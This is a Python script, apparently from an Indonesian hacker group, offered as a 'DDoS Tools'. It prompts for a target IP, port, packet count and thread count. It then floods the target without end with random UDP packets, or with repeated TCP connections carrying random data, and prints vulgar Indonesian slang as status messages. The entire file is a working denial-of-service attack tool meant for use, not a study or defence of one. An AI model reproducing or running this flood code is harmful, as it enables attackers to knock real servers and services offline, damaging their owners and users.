#!/usr/bin/env python3
#Kagak Usah Rename BY By Tai Anjing 
#Ddos by Vnz
import random
import socket
import threading
import os

os.system("clear")
print("DDoS Tools By WillardZy Team")
print("Ez")
ip = str(input(" Ip: "))
port = int(input(" Port: "))
choice = str(input(" Gas?(y/n): "))
times = int(input(" Packets: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Jebol Kontol.......")
    except:
      print("[!] WillardZy Team Nieh Bwang")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Permisii Om Numpang Lewat!!!")
    except:
      s.close()
      print("[*] Rataaa Bozzz")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()